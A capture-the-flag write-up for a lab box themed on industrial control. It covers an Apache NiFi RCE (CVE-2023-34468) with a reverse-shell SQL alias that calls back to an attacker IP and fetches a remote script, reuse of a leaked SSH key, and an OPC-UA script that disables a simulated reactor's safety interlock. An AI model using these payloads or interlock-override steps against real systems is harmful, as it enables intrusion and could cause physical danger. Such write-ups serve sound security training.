# CTF – Helix (Writeup)

## Context

Linux box with an ICS/OT theme. A `flow.helix.htb` subdomain runs Apache NiFi 1.21.0 (CVE-2023-34468). Foothold is NiFi RCE, then an operator SSH key is recovered from a NiFi backup file. Root comes from manipulating a simulated reactor over OPC-UA to satisfy the safety-condition check of a sudo-able command.

## Recon

No nmap file in my notes. What I worked with:

- **`flow.helix.htb`** – Apache NiFi 1.21.0, reachable through the vhost. The API (`/nifi-api`) allows anonymous write, which is the whole problem.
- **`opc.tcp://127.0.0.1:4840/helix/`** – a local OPC-UA server exposing a reactor-control address space (temperature, trip, control rods, test override). `control.png` is a screenshot of that control panel.

## Initial access – Apache NiFi RCE (CVE-2023-34468)

CVE-2023-34468 abuses NiFi's `DBCPConnectionPool` with an H2 JDBC URL: H2 lets you define SQL aliases that run Java, so a crafted connection string plus an `ExecuteSQL` processor gives code execution. `poc.py` automates the full API dance.

```
python3 poc.py --target http://flow.helix.htb --lhost 10.10.15.189 --lport 4444
```

The script:

1. Confirms anonymous access with `controllerPermissions.canWrite = true`.
2. Creates a `DBCPConnectionPool` controller service with URL `jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;` and the bundled `h2-2.1.214.jar` driver.
3. Creates an `ExecuteSQL` processor whose query is `RUNSCRIPT FROM 'http://10.10.15.189:80/rce.sql'`.
4. Serves `rce.sql` from a built-in HTTP server. That script registers an H2 alias and calls it:

```sql
CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    ... Runtime.getRuntime().exec(command) ...
}
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.15.189/4444 0>&1');
```

Starting the processor fires the query, runs the reverse shell, and I get a shell as the `nifi` user on `nc -lvnp 4444`.

## Lateral movement – operator SSH key from a NiFi backup

In the NiFi install directory (`/opt/nifi-*`) there is a `.bak` file that is `operator`'s private SSH key (an ed25519 key, comment `root@management`). I pull it down and SSH in:

```
ssh -i operator_id_ed25519.bak operator@helix.htb
```

Now I'm `operator`.

## Privilege escalation – OPC-UA reactor manipulation to satisfy a sudo gate

`sudo -l` as `operator` shows a command that opens a root shell/terminal, but only when the reactor is in a specific "safe to service" state — it checks for a maintenance window (`/opt/helix/state/maintenance_window`) that only appears once the reactor has tripped and been put into the right condition. So I drive the OPC-UA reactor into that state.

The script connects to the local OPC-UA server and writes control variables to bypass the safety interlock, reset the trip, and force the temperature up until the maintenance window opens:

```python
import asyncio
from asyncua import Client, ua

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        # 1. TestOverride = True (disables the safety)
        await client.get_node("ns=2;i=13").write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
        # 2. ResetTrip = True
        await client.get_node("ns=2;i=14").write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
        await asyncio.sleep(1)
        # 3. Push the temperature offset up
        await client.get_node("ns=2;i=6").write_value(ua.DataValue(ua.Variant(12.0, ua.VariantType.Double)))
        # 4. Watch temp / trip / rods / maintenance window
        for _ in range(20):
            temp = await client.get_node("ns=2;i=4").read_value()
            trip = await client.get_node("ns=2;i=10").read_value()
            rods = await client.get_node("ns=2;i=8").read_value()
            import os
            win = os.path.exists("/opt/helix/state/maintenance_window")
            print(f"Temp: {temp:.1f} | Trip: {trip} | Rods: {rods} | Window: {win}")
            await asyncio.sleep(1)

asyncio.run(main())
```

I run this in one terminal to open the maintenance window, and in a second terminal run the sudo command while the condition holds. That gives the root shell.

## Conclusion

NiFi 1.21.0 with anonymous write access → H2 JDBC alias RCE (CVE-2023-34468) for a `nifi` shell. An operator SSH key left in a NiFi backup file gave lateral movement. Root was a logic problem: an OT-style sudo command was gated on the reactor's state, so I used OPC-UA writes to disable the safety interlock and force the maintenance window open, then ran the command.

## Skills demonstrated

- Apache NiFi RCE via `DBCPConnectionPool` + H2 JDBC aliases (CVE-2023-34468)
- Recovering and reusing an SSH private key left in an application backup
- OPC-UA client scripting with `asyncua` (reading/writing node IDs in an address space)
- Defeating a state-dependent sudo gate by manipulating the underlying ICS process
